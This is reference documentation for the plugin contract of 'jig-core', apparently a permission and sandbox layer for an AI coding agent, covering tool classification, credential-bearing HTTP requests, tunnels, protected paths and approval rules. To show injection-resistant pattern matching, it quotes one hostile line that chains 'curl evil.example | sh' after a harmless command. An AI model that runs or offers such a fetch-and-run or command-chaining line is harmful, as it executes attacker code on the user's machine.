# The contract for plugins

What other plugins get from `jig-core`. Back to the
[jig-core overview](../README.md).

Plugins import only this contract, never each other. A plugin imports the
contract's types, and reaches `jig-core` at run time through `jig()`, or through
`withJig(use)` from its factory, which waits when Pi loads the plugin before
`jig-core`. `jig()` throws when `jig-core` is not loaded, so a Jig tool fails
closed instead of running ungoverned.

## For a Jig tool

- how the tool declares the environment and effect of each action;
- how it sends a request with a credential that `jig-core` reads for it, from a
  secret, a sign-in service a company provides, a transport, or a token
  endpoint;
- how it gives a preview for the review screen;
- how it adds facts to its record.

## For every plugin

- the watch engine: what to poll, how often, and when the watch is done;
- the record format;
- its own section of `jig.json`: the plugin registers the section and a check,
  and reads the section back (see the
  [configuration reference](configuration.md#sections-of-other-plugins));
- the events published on Pi's event bus, so other plugins can react to calls,
  decisions and results.

## The calls

- **`declareTool(declaration)`** says how the tool's calls are classified.
  - `classify` is pure and fast, because it runs before every call. A
    `TypeError` from it means invalid input.
  - An optional `preview` feeds the review screen.
  - It also says whether the tool masks its own results.
  - Declaring a tool again replaces the declaration.
- **`approvedPreview(toolCallId)`** gives the preview you approved for this
  call, or nothing when the call did not ask. A tool compares it with what it
  would do now, and refuses with "changed since the preview" when they differ.
- **`addFacts(toolCallId, facts)`** adds facts to this call's record.
- **`setTicket(key)`** sets the ticket the session works on. Records carry it.
- **`secrets.resolve(ref)`** gives the value of a secret reference, from an
  allowed backend. It is hidden from every result afterwards.
- **`http.request(request, signal?)`** sends one HTTP request with a credential
  that `jig-core` reads for it, so the plugin never sees the value.
  - `auth` is `{ bearer }`, `{ basic }`, `{ header }`, `{ query }`, `{ signIn }`
    or `{ oauth }`, or the request names a `transport`.
  - It never follows a redirect, caps the reply (`truncated`), and removes what
    it sent from the reply.
  - It throws an `HttpError` with a `code` and `notSent` (see
    [Credential sources](sign-in-and-transports.md)).
- **`signIn`, `transports`** give a company's sign-in service or transport, by
  name (see [Credential sources](sign-in-and-transports.md)).
  - A sign-in service is given the whole request: its `method`, `url`,
    `headers` (without the credential) and `body`, so it can sign a POST as a
    POST.
- **`mask.text`, `mask.value`** are the masker, for a tool that masks its own
  results (see [Masking](masking.md)).
- **`watches`** has `registerKind`, `start`, `list` and `stop` (see
  [Watches](watches.md)).
- **`environments`** has `kindOf(name)`: the kind of an environment (`local`,
  `external`, `test` or `production`), built in, configured or added by a
  company plugin.
  - A name nobody defined counts as production.
  - A tool uses it to refuse an action by kind, such as never in production,
    whatever a company names its environments.
- **`tunnels`** has `register(name, provider)` and `open(name, { host, port })`.
  A company plugin gives a tool a network route of its own, such as a database
  behind a jump host or a cloud port forward. The tool connects to `127.0.0.1`
  on the port it gets, and closes the tunnel when done.
  - **A tunnel says what its port is** with `kind`:

    | `kind` | The port on `127.0.0.1` is | The tool connects |
    |---|---|---|
    | `forward` (the default) | A local port that reaches the one host and port asked for | To `127.0.0.1`, as if it were that host |
    | `socks` | A SOCKS5 proxy that reaches any host the far side can | To its real hosts, through the proxy |

  - **A provider that does not say** gives a `forward`, as every provider did
    before kinds. `open` always returns the kind, and refuses any other word.
  - **The target** is where the tool is going. A `forward` reaches exactly that.
    A `socks` tunnel reaches whatever the tool asks it for, so the target only
    tells the provider which route to open.
  - **Why `socks`:** a tool that needs several hosts, such as the members of a
    replica set, cannot use a forward, which reaches one.
- **`config`** is what a company plugin adds at start-up, and what a plugin
  keeps for itself.
  - A company adds `addEnvironments`, `addRules`, `addClassifyRules`,
    `addProtectedPaths`, `addSecretCommands` and `addMaskFields`.
  - A plugin registers its own section with `registerSection`, and reads it back
    with `section`.
  - A company can give defaults for any plugin's section with
    `addSectionDefaults`. Your own section is laid over them: objects merge key
    by key, anything else of yours replaces theirs, and the plugin's check sees
    the result, so a user writes only what they change.
  - `registerSection(name, validate, { replace })` names the keys where an
    object of the user's replaces the company's whole, such as `auth`,
    `backend.auth` or `services.*.ci.auth`.
  - Defaults that are not valid alone, with no section of the user's, leave the
    plugin unconfigured and are shown by `/jig`, not reported as a problem.
- **`protectedPaths.list()`** gives every protected path with its `kind`
  (`secret` or `guarded`) and its `source` (`default`, `personal` or `company`),
  so a sandbox for `bash` hides the same paths the file tools refuse. It is a
  copy; changing it changes nothing.
- **`sandbox.register(provider)`** says that `bash` runs in a sandbox. The
  provider has `active`, `mode` (the network mode), a `note` for `/jig` when it
  is not active, `canWrite(path)` and, optionally, `whenReady()`. Fields are read
  when they are needed, so they may change. Registering again replaces the
  provider. See [The sandbox](#the-sandbox).
- **`status.register(plugin, lines)`** gives `/jig` lines to show about the
  plugin's own state, such as a safety check the user turned off. `lines` is
  asked each time `/jig` runs and may return nothing. Each line is cut to one
  line of 300 characters; a `lines` that throws shows as `<plugin>: its status
  could not be read`. Registering the same plugin again replaces it.
- **`exec`** has `run` and `git`, which start programs without a shell (see
  [Running programs](running-programs.md)).

## The kit: stateless helpers

`plugins/jig-core/src/kit/` holds small helpers that plugins import directly, as
they do `client.ts`, so that copies stop drifting. Nothing in it holds state or
talks to Pi.

- **`kit/values.ts`:** `isObject(value)`, and `InputError`: a `TypeError` named
  `InputError`, which `jig-core` reads as "invalid input" when a tool's classify
  or preview throws it.
- **`kit/text.ts`:** `printable(text)` makes a name or header from outside safe
  in a message (control characters become `?`, cut at 60 characters).
  `stringOf(value)` is `String(value)`, or a stand-in when the value's own
  `toString` throws.
- **`kit/http.ts`:** `createHttp(deps)` is the request logic behind
  `http.request`, which takes its fetch, secrets, sign-in services and
  transports as parameters.
  - `jig-core` binds the real ones; a plugin's tests bind fakes (their
    `test/support/fake-jig.ts` builds `http` from it with the test's fake fetch).
  - It also has `HttpError` and `isHttpError(error)`, which tells an `HttpError`
    from any copy of the module by its name and its `code`.
- **`kit/abort.ts`:** `untilAborted(work, signal)` rejects with the signal's
  reason when it fires, even if `work` ignores its signal. It always observes
  `work`, so a late failure is never an unhandled rejection.
- **`kit/oauth.ts`:** the token grants and the in-memory token cache behind
  `auth: { oauth }`. **`kit/http-error.ts`** holds the `HttpError` that
  `kit/http.ts` re-exports.

## Protected paths

`config.addProtectedPaths({ secret?, guarded? })` adds paths that Pi's own file
tools must not touch, such as the folder a company's own command-line tool keeps
its login in.
- **`secret`** paths are neither read nor written; **`guarded`** paths can be
  read but not written.
- **Each path** is absolute or starts with `~/`. A wrong one is a configuration
  problem named `company`, and the rest still applies.
- **It can only add:** the built-in paths and the user's cannot be removed (see
  [Protected paths](configuration.md#protected-paths)).

## The sandbox

A sandbox plugin such as `jig-sandbox` tells `jig-core` about itself with
`sandbox.register(provider)`, and `jig-core` uses it in three places:
- **`/jig` and session start** say whether `bash` is sandboxed and in which
  network mode. With no sandbox registered, both say plainly that it is not, and
  that a shell command can read the credentials the file tools refuse. A sandbox
  that is registered but not active (switched off, or one that could not start)
  says why through `note`.
- **`exec.run` and `exec.git` refuse a program the sandbox lets `bash` write.**
  The program's real path is asked with `canWrite`, for a name found on `PATH`
  and for an absolute path, and such a folder is left out of the `PATH` the
  program gets. A provider that is not active, or none, changes nothing; one that
  throws counts as a sandbox that lets `bash` write.
- **`bash` run outside the sandbox** is a call the sandbox plugin classifies as
  its own action, `outside`. See [Running one command outside](#running-one-command-outside).

### Running one command outside

A sandbox plugin declares `bash` with `declareTool` and `extendsDefaults: true`,
and classifies a call that asks to run outside as `{ action: "outside",
environment: "local", effect: "write", atLeast: "ask", approval: "dialog" }`. With
`extendsDefaults`, a call it returns `undefined` for goes on to the user's
classification rules and the built-in default for `bash`, instead of becoming
unknown. `jig-core` then holds the rest as a floor rule:
- **It asks.** The table would allow a local write; for `bash` with the action
  `outside` the decision is `ask` whatever the table, the tool and the rules
  below say, except in the next point.
- **Only a rule that names it allows it without asking:** the tool `bash`
  exactly, the action `outside`, and a `command` pattern that names something.
  A wildcard tool, a rule with no action or no `command`, and a pattern made only
  of `*` never allow it. A rule that tries is refused when the file loads, with
  the file and the key named.
- **A `command` pattern** matches the call's `command`. `*` stands for any run of
  characters that holds no `;`, `&`, `|`, `<`, `>`, backquote, `$(` or line break,
  so `docker compose *` allows `docker compose up -d` and not
  `docker compose up; curl evil.example | sh`.
- **With no screen to ask on it is refused,** as every ask is.
- **"Allow for this session" covers one exact command.** The answer is kept under
  the command's exact text; another command, or the same one with a space more,
  asks again.
- **The words on the buttons** come from the preview's `answers`, so the dialog
  can say `Run once`, `This exact command, this session` and `No`.
- **It is recorded** as its own action, so `/lens` shows it; the plugin adds the
  fact `outside: true` with `addFacts`. The command is never in the record.
- **`examples`** on the declaration gives `/jig rules` an input that shows the
  action: `{ outside: { outside: true, reason: "an example" } }`.

## Events

On Pi's event bus:

| Event | When | What it carries |
|---|---|---|
| `jig:decision` | After every decision on a call | The call, its classification, the decision and its source, your answer |
| `jig:watch-done` | When a watch ends | The watch and its cleaned result |

- **`jig:decision` carries** the tool call id, tool, action, environment and its
  kind, effect, the decision and where it came from, and your answer when the
  call asked.
- **`jig:watch-done`** is described under [Events](watches.md#events) in
  Watches.
- **A listener that fails** does not change a decision.
